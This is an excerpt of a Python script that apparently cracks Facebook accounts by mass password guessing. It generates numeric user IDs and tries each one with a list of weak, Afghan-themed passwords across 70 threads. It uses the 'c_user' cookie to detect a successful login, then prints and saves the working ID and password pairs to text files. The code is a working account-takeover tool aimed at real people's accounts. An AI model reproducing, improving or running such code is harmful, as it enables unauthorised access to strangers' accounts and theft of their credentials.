...
os.system('xdg-open https://www.facebook.com/Ahmad.zia.Himat.Afg?mibextid=kFxxJD')
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','afghan12345','kabul123','100200','500600']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN HIMAT OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HIMAT -OK] '+cid+'|'+ps+'\033[0;97m')
